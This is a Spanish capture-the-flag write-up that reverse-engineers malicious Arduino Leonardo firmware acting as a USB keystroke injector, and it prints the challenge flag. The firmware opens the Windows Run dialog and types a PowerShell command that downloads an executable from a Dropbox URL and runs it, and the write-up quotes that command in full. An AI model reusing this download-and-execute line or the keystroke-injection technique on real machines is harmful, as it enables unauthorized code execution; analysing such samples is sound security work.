# 🦆

Descripción: El otro día me encontré una memoria USB tirada por la calle. Quería saber que contenía pero al enchufarla se empezaron a ver cosas raras. Necesito que averigues que pasó realmente cuando conecté ese USB.

Flag: UAD360{quack_quack!!!!}

## Writeup

Se nos da un fichero .elf con una arquitectura `Atmel AVR 8-bit`. Seguramente sea un firmware de una placa arduino ya que suelen usar ese tipo de microcontroladores. Al ser un elf y no un .hex, mantiene mucha información que va a ser útil en el análisis del programa. Podemos abrirlo con Ghidra para hacerle ingeniería inversa al firmware.

Nos encontramos con una función main(). Después de la incialización que hace el firmware en el main podemos ver que usa la biblioteca [Keyboard](https://www.arduino.cc/reference/en/language/functions/usb/keyboard/).

```
  uStack0000 = 0x70;
  delay(0,1000,R18,R15R14,R13R12,R11R10,R9R8);
  Keyboard[13] = 1;
  Keyboard[12] = 0x21;
  uStack0000 = 0x7b;
  Keyboard_::press('v');
  uStack0000 = 0x80;
  Keyboard_::press('v');
  ....
  Keyboard[4] = R1;
  uStack0000 = 0x92;
  Keyboard_::sendReport((KeyReport *)(Keyboard + 4));
  uStack0000 = 0x98;
  delay(0,200,R18,R15R14,R13R12,R11R10,R9R8);
  R21R20 = 0xa2;
  uStack0000 = 0xa0;
  Keyboard_::write(Keyboard,(uint)s_powershell_"Import-Module_BitsTr_mem_013d);
  uStack0000 = 0xa5;
  Keyboard_::write('v');
  uStack0000 = 0xab;
  delay(0,1000,R18,R15R14,R13R12,R11R10,R9R8);
  uStack0000 = 0xb0;
  Keyboard_::write('v');
  do {
  } while( true );
```
Como podemos ver en la documentación, la función `press()` sirve para mantener pulsada una tecla hasta que se envíe `releaseAll()`. Podemos suponer que se envían dos teclas. Sin embargo, ghidra no nos está mostrando bien el parámetro que se le pasa a la función. Si miramos el ensamblador podemos ver que en realidad, son teclas dintintas. Para los dos primeros `press()`, sería:
```
       code:0a76 63  e8           ldi        R22 ,0x83 // Tecla que se envía
       code:0a77 86  e7           ldi        Wlo ,0x76
       code:0a78 92  e0           ldi        Whi ,0x2
       code:0a79 0e  94  79       call       Keyboard_::press                               
                 05
       code:0a7b 62  e7           ldi        R22 ,0x72 // Tecla que se envía
       code:0a7c 86  e7           ldi        Wlo ,0x76
       code:0a7d 92  e0           ldi        Whi ,0x2
       code:0a7e 0e  94  79       call       Keyboard_::press                              
                 05
```
Por lo tanto, cuando se conecta el arduino, se mandan las teclas 0x83 y 0x72. Podemos ver en la [referencia](https://www.arduino.cc/reference/en/language/functions/usb/keyboard/keyboardmodifiers/) de Arduino qué significa cada tecla.

0x83 equivaldría a la tecla de Windows, y 0x72, a la r. Por tanto, lo que hace es pulsar Windows+r (Menú de ejecutar)

Lo próximo que hace es un `write()` de una cadena larga: 

```
powershell \"Import-Module BitsTransfer; Start-BitsTransfer https://dl.dropboxusercontent.com/s/uzycu5lu9fx257t/Quack.exe %TEMP%qweiuagsd.exe; %TEMP%qweiuagsd.exe\"
```

Este comando va a descargar un fichero .exe y lo va a ejecutar. Procedemos, por tanto a descargar el ejecutable y a analizarlo.

Si lo habrimos con Ghidra y analizamos un poco en binario, podemos encontrar una función interesante (`FUN_00401170(void)`). Esta función va a comprobar el PID (PID_8036) y el VID (VID_2341) de todos los dispositivos USB conectados. En caso de que concuerden se imprimirán una serie de Diálogos en la pantalla. En caso contrario, se imprimirá un diálogo diciendo que no deberíamos estar ejecutando el programa.

```
pwVar3 = wcsstr(_Str,L"PID_8036");
if ((pwVar3 != (wchar_t *)0x0) &&
    (pwVar3 = wcsstr(_Str,L"VID_2341"), pwVar3 != (wchar_t *)0x0)) {
...
}
```

Si buscamos el PID y el VID en internet se confirma que es un Arduino, el concreto, un Arduino Leonardo. Para poder entrar dentro del if prodremos o crear un USB virtual o usar ida para saltarnos la comprobación. En este caso se usará IDA. 

Para ello buscamos la función en ida y podemos un punto de ruptura justo donde se ha a hacer la comparación. En cada una de las dos cambiamos el fulo del programa para que la comparación de correcta. Cuando hayamos pasado todas las comparaciones seguimos el flujo del programa normal. Se nos van a mostrar tres diálogos, siendo el último la flag

`UAD360{quack_quack!!!!}`
